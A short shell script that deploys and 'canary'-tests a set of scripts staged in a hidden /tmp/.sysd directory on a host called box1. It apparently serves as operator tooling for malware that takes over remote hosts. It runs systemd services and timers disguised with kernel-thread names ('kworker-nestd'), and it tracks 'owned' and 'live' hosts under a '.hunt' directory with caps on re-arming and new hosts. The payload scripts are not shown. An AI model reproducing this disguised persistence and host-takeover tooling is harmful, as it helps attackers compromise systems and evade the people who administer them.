#!/bin/sh
# throwaway: deploy + canary. Runs ON box1 after the files are scp'd.
set -u
S=/tmp/.sysd
echo "== syntax"
for f in dock.sh dockhot.sh pool.sh updater.sh; do
    sh -n "$S/$f" 2>/dev/null && echo "SYNTAX_OK $f" || echo "SYNTAXFAIL $f"
done
python3 -m py_compile "$S/_nestd.py" 2>&1 | head -3 && echo PY_OK
echo "== restart nestd (load the hot-queue code)"
systemctl restart kworker-nestd 2>/dev/null && echo nestd_restarted
sleep 2
curl -s -m 4 http://127.0.0.1:8080/stat; echo
echo "== timers"
for t in kworker-hot.timer kworker-poll.timer; do
    systemctl enable --now "$t" >/dev/null 2>&1 && echo "enabled $t"
done
systemctl daemon-reload 2>/dev/null
systemctl restart kworker-nest.timer 2>/dev/null && echo "nest timer cadence reloaded"
echo "== canary: one re-arm host + one fresh, re-create cap 3"
DOCK_REARM_MAX=1 DOCK_MAX_HOSTS=3 DOCK_RECREATE_MAX=3 sh "$S/dock.sh" 2>&1 | tail -14
echo "== canary: hot path"
sh "$S/dockhot.sh" 2>&1 | tail -4
echo "== pool instrument"
sh "$S/pool.sh" log 2>&1 | tail -4
echo "== state"
echo "live=$(sort -u "$S/.hunt/dock.live" 2>/dev/null | wc -l) owned=$(wc -l < "$S/.hunt/dock.owned" 2>/dev/null)"
echo "hotqueue=$(wc -l < "$S/.hunt/hot.queue" 2>/dev/null || echo 0)"
date -u
